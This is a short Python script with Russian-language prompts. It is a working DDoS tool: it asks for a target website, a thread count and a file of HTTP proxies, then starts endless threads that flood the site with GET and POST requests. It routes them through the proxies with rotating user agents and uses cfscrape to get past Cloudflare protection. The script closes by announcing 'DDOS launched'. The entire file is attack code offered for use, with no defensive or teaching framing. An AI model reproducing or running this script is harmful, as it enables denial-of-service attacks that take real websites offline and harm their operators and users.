import random

import cfscrape
import threading

adress = input('Адрес сайта: ')
thread = int(input('Потоки: '))
proxy_file_name = input('Название вайла с http прокси: ')

with open(proxy_file_name, 'r') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')

with open('useragent', 'r') as useragent:
    userag = ''.join(useragent.readlines()).strip().split('\n')

def attack_1(url, proxy, headers):
    cf = cfscrape.CloudflareScraper()
    while True:
        proxieshttp = {'http': f'http://{proxy}'}
        head = random.choice(headers)
        header = {'accept': '*/*', 'user-agent': head}

        try:
            cf.get(url, proxies=proxieshttp, headers=header)
            cf.post(url, proxies=proxieshttp, headers=header)
        except:
            pass

def attack_2(url, proxy, headers):
    cf = cfscrape.CloudflareScraper()
    while True:
        proxieshttps = {'https': f'http://{proxy}'}
        head = random.choice(headers)
        header = {'accept': '*/*', 'user-agent': head}

        try:
            cf.get(url, proxies=proxieshttps, headers=header)
            cf.post(url, proxies=proxieshttps, headers=header)
        except:
            pass

for i in range(thread):
    for a in proxy_http:
        threading.Thread(target=attack_1, args=(adress, a, userag)).start()
        threading.Thread(target=attack_2, args=(adress, a, userag)).start()

print('DDOS запущен')
